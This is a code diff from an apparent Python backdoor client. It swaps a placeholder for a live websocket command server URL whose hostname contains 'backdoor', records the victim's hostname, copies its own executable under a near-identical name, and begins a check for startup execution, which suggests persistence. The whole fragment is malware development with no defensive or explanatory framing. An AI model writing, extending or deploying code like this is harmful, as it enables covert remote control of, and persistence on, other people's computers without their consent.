@@ -10,22 +10,26 @@ import subprocess
 import socket
 import shutil
 
-current_exe = sys.executable
+server_url = "wss://backdoor-freezeee.onrender.com"
 
-server_url = "YOUR_SERVER_URL"
 CLIENT_NAME = socket.gethostname()
 
-current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
 
-dir_path = os.path.dirname(os.path.abspath(current_exe))
-filename = os.path.basename(current_exe)
+if getattr(sys, 'frozen', False):
+    current_path = sys.executable
+else:
+    current_path = os.path.abspath(__file__)
+
+dir_path = os.path.dirname(current_path)
+filename = os.path.basename(current_path)
 
 name, ext = os.path.splitext(filename)
 
 new_name = name + "l" + ext
 new_path = os.path.join(dir_path, new_name)
 
-shutil.copy2(current_exe, new_path)
+if not os.path.exists(new_path):
+    shutil.copy2(current_path, new_path)
 
 def will_startup_execute(filename):
     filename = filename.lower()
